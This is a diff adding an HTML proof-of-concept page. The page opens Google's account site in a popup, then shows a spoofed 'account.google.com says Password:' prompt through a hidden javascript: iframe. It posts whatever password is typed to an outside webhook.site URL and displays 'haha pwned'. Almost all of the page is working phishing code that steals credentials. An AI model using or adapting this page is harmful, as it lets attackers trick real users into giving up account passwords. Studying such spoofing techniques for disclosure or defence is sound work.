@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC - onblur Trigger</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            text-align: center;
+        }
+        button {
+            padding: 15px 30px;
+            background: #ff4444;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 50px;
+            border: none;
+        }
+        button:hover { background: #cc0000; }
+        #status {
+            margin-top: 20px;
+            color: #333;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        iframe { visibility: hidden; }
+    </style>
+</head>
+<body>
+    <h2>Click to Trigger Spoofed Prompt (onblur)</h2>
+    <button id="triggerBtn">Spoof Prompt</button>
+    <div id="status"></div>
+    <iframe id="iframe"></iframe>
+
+    <script>
+        let popupWindow = null;
+
+        document.getElementById('triggerBtn').onclick = () => {
+            // Buka Google Account
+            popupWindow = window.open('https://account.google.com/', '_blank');
+            if (!popupWindow) {
+                document.getElementById('status').innerHTML = 'Popup blocked!';
+                return;
+            }
+
+            // Setup onblur: ketika user klik di luar (misal OK di prompt), trigger prompt
+            window.onblur = function () {
+                const code = `(function(){
+                    var p = prompt("account.google.com says\\n\\nPassword:");
+                    if(p){
+                        document.write('<form method="POST" action="https://webhook.site/a0e0c5fe-06e8-45e3-a9c0-de820eb2432d/submit" id="f">'
+                            + '<input type="hidden" name="password" value="'+p+'">'
+                            + '<input type="submit"></form>');
+                        document.getElementById("f").submit();
+                    }
+                })()`;
+
+                // Inject ke iframe tersembunyi
+                const iframe = document.getElementById('iframe');
+                iframe.src = 'javascript:' + code;
+
+                // Update status
+                setTimeout(() => {
+                    document.getElementById('status').innerHTML = 'haha pwned<br>Password captured!';
+                    if (popupWindow && !popupWindow.closed) popupWindow.close();
+                }, 1500);
+
+                // Reset onblur
+                window.onblur = null;
+            };
+
+            // Fallback: jika onblur gagal, pakai delay
+            setTimeout(() => {
+                if (window.onblur) {
+                    document.getElementById('status').innerHTML = 'onblur not triggered. Using fallback...';
+                    window.onblur = null;
+                    // Trigger manual
+                    const iframe = document.getElementById('iframe');
+                    iframe.src = 'javascript:' + code.replace(/\\n/g, '\\n');
+                }
+            }, 5000);
+        };
+    </script>
+</body>
+</html>
